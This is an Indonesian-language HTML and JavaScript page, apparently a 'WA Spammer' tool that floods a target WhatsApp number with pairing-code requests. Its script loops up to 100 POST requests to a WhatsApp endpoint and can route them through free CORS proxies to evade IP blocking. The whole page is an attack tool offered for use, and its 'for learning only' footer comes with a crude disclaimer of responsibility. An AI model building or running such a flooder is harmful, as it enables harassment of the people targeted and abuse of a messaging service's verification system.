<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WA Spammer - Web Edition</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(145deg, #0a0f1f 0%, #1a1f35 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(20, 25, 45, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid #ffd966;
            border-radius: 30px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
        }
        
        h1 {
            color: #ffd966;
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        
        .subtitle {
            color: #a0a8c0;
            text-align: center;
            margin-bottom: 30px;
            border-left: 3px solid #ffd966;
            padding-left: 15px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #cbd5e1;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(10, 15, 30, 0.7);
            border: 1px solid #ffd966;
            border-radius: 40px;
            color: white;
            font-size: 1rem;
            transition: 0.2s;
        }
        
        input:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(255,215,0,0.3);
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-group input[type="checkbox"] {
            width: auto;
            margin-right: 10px;
        }
        
        .checkbox-group label {
            margin-bottom: 0;
            cursor: pointer;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(145deg, #ffd966, #f0b400);
            border: none;
            border-radius: 40px;
            color: #0a0f1a;
            font-size: 1.2rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin: 20px 0;
        }
        
        button:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px #f0b40080;
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .stats {
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            padding: 20px;
            border: 1px solid #ffd966;
            color: white;
        }
        
        .stats div {
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
        }
        
        .stats .label {
            color: #cbd5e1;
        }
        
        .stats .value {
            color: #ffd966;
            font-weight: 700;
        }
        
        .log-container {
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0,0,0,0.5);
            border-radius: 15px;
            padding: 15px;
            border: 1px solid #ffd96633;
        }
        
        .log-entry {
            color: #a0a8c0;
            font-size: 0.9rem;
            padding: 3px 0;
            border-bottom: 1px solid #ffd9661a;
        }
        
        .log-entry.success {
            color: #4ade80;
        }
        
        .log-entry.error {
            color: #f87171;
        }
        
        .warning {
            color: #fbbf24;
            font-size: 0.85rem;
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #ffd96633;
            padding-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WA SPAMMER</h1>
        <div class="subtitle">Pairing Code Flooder - Web Edition</div>
        
        <div class="input-group">
            <label>📱 Nomor Target (628xxx)</label>
            <input type="text" id="target" placeholder="628123456789" value="628">
        </div>
        
        <div class="input-group">
            <label>📊 Jumlah Spam (max 100)</label>
            <input type="number" id="jumlah" min="1" max="100" value="20">
        </div>
        
        <div class="checkbox-group">
            <input type="checkbox" id="useProxy">
            <label for="useProxy">🔄 Gunakan Proxy Gratis (untuk menghindari blok IP)</label>
        </div>
        
        <button id="startBtn" onclick="startSpam()">🔥 MULAI SPAM</button>
        <button id="stopBtn" onclick="stopSpam()" style="background: linear-gradient(145deg, #666, #444); margin-top: 0;" disabled>🛑 STOP</button>
        
        <div class="stats">
            <div>
                <span class="label">Status:</span>
                <span class="value" id="status">SIAP</span>
            </div>
            <div>
                <span class="label">Terkirim:</span>
                <span class="value" id="sent">0</span>
            </div>
            <div>
                <span class="label">Gagal:</span>
                <span class="value" id="failed">0</span>
            </div>
            <div>
                <span class="label">Sisa:</span>
                <span class="value" id="remaining">0</span>
            </div>
        </div>
        
        <div class="log-container" id="log"></div>
        
        <div class="warning">
            ⚠️ Tools ini cuma buat pembelajaran! Resiko: IP lo bisa diblokir WhatsApp.<br>
            Gue ga tanggung jawab kalo lo ketangkep, kontol!
        </div>
    </div>
    
    <script>
        // ===== STATE =====
        let isRunning = false;
        let shouldStop = false;
        let successCount = 0;
        let failCount = 0;
        let totalTarget = 0;
        let currentIndex = 0;
        
        // ===== ELEMENTS =====
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const targetInput = document.getElementById('target');
        const jumlahInput = document.getElementById('jumlah');
        const useProxyCheckbox = document.getElementById('useProxy');
        const statusSpan = document.getElementById('status');
        const sentSpan = document.getElementById('sent');
        const failedSpan = document.getElementById('failed');
        const remainingSpan = document.getElementById('remaining');
        const logDiv = document.getElementById('log');
        
        // ===== PROXY LIST (Gratis, mungkin tidak stabil) =====
        const freeProxies = [
            'https://cors-anywhere.herokuapp.com/',
            'https://api.codetabs.com/v1/proxy?quest=',
            'https://proxy.cors.sh/'
        ];
        
        // ===== FUNGSI LOG =====
        function addLog(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // ===== UPDATE STATS =====
        function updateStats() {
            sentSpan.textContent = successCount;
            failedSpan.textContent = failCount;
            remainingSpan.textContent = totalTarget - (successCount + failCount);
        }
        
        // ===== RESET =====
        function reset() {
            isRunning = false;
            shouldStop = false;
            successCount = 0;
            failCount = 0;
            currentIndex = 0;
            totalTarget = 0;
            updateStats();
            statusSpan.textContent = 'SIAP';
            startBtn.disabled = false;
            stopBtn.disabled = true;
            targetInput.disabled = false;
            jumlahInput.disabled = false;
        }
        
        // ===== FUNGSI SPAM =====
        async function sendPairingCode(index) {
            const target = targetInput.value.trim();
            let url = 'https://web.whatsapp.com/v1/code';
            
            if (useProxyCheckbox.checked) {
                const proxy = freeProxies[Math.floor(Math.random() * freeProxies.length)];
                url = proxy + url;
                addLog(`🔄 Menggunakan proxy: ${proxy}`);
            }
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Android)',
                        ...(useProxyCheckbox.checked && url.includes('cors-anywhere') ? { 'X-Requested-With': 'XMLHttpRequest' } : {})
                    },
                    body: JSON.stringify({
                        cc: target.substring(0, 2),
                        in: target.substring(2),
                        method: 'sms'
                    })
                });
                
                if (response.status === 200) {
                    addLog(`✅ [${index}] Kode terkirim`, 'success');
                    successCount++;
                } else {
                    addLog(`❌ [${index}] Gagal: HTTP ${response.status}`, 'error');
                    failCount++;
                }
            } catch (error) {
                addLog(`❌ [${index}] Error: ${error.message}`, 'error');
                failCount++;
            }
            
            updateStats();
        }
        
        // ===== MAIN SPAM LOOP =====
        async function spamLoop() {
            totalTarget = parseInt(jumlahInput.value) || 20;
            if (totalTarget > 100) totalTarget = 100;
            
            for (let i = 1; i <= totalTarget; i++) {
                if (shouldStop) {
                    addLog('🛑 Spam dihentikan user');
                    break;
                }
                
                currentIndex = i;
                statusSpan.textContent = `SPAM ${i}/${totalTarget}`;
                
                await sendPairingCode(i);
                
                // Delay random 2-4 detik
                const delay = 2000 + Math.random() * 2000;
                await new Promise(r => setTimeout(r, delay));
            }
            
            addLog('✅ Spam selesai!');
            reset();
        }
        
        // ===== START SPAM =====
        function startSpam() {
            const target = targetInput.value.trim();
            
            // Validasi
            if (!target.startsWith('62') || target.length < 10) {
                addLog('❌ Nomor harus format 628xxx', 'error');
                return;
            }
            
            if (isRunning) {
                addLog('⚠️ Spam masih berjalan');
                return;
            }
            
            // Reset state
            isRunning = true;
            shouldStop = false;
            successCount = 0;
            failCount = 0;
            logDiv.innerHTML = ''; // Clear log
            
            addLog(`🔥 Memulai spam ke ${target}`);
            
            startBtn.disabled = true;
            stopBtn.disabled = false;
            targetInput.disabled = true;
            jumlahInput.disabled = true;
            
            // Mulai loop
            spamLoop();
        }
        
        // ===== STOP SPAM =====
        function stopSpam() {
            shouldStop = true;
            stopBtn.disabled = true;
            addLog('🛑 Menghentikan spam...');
        }
    </script>
</body>
</html>
